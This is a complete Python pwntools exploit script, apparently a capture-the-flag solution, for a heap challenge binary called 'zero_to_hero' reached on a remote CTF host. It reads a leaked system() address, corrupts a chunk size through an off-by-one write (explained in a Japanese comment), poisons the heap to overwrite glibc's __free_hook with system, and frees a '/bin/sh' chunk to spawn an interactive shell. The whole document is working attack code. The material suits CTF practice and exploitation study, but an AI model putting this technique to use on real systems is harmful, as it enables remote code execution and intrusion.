# coding: utf-8
from pwn import *

elf = ELF("zero_to_hero")
context.binary = elf

#s = process("./zero_to_hero")
s = remote("shell1.production.cognitivectf.com", 30612)

def get(n, d):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(n))
  s.sendafter("> ", d)

def remove(i):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(i))

s.sendafter("?\n", "y")
s.recvline()
s.recvline()
system = eval(s.recvline().split()[-1])

get(0x18, "a")
get(0x108, "a")
remove(1)
remove(0)
# 2個目のチャンクのサイズを0x110から0x100に書き換え
get(0x18, "a"*0x18)
remove(1)

libc = ELF("libc.so.6")
libc.address = system - libc.symbols.system

# __free_hook = system
get(0x108, pack(libc.symbols.__free_hook))
get(0xf8, "/bin/sh")
get(0xf8, pack(libc.symbols.system))

# free("/bin/sh") (= system("/bin/sh"))
remove(4)

s.interactive()